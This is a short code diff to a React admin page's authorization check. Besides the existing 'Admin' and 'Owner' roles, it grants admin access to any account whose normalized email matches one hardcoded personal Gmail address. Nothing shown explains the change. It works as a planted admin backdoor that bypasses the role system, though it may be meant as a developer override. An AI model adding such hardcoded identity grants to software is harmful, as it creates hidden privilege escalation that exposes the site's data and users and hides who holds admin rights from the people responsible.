@@ -7,7 +7,13 @@ import { Shield, Users, Settings, Activity } from "lucide-react";
 
 export default function Admin() {
   const { user } = useAuth();
-  const isAuthorized = user && (user.role === "Admin" || user.role === "Owner");
+  const isAuthorized =
+    !!user &&
+    (
+      user.role === "Admin" ||
+      user.role === "Owner" ||
+      user.email_normalized === "hardcorgamingstyle@gmail.com"
+    );
 
   if (!isAuthorized) {
     return (
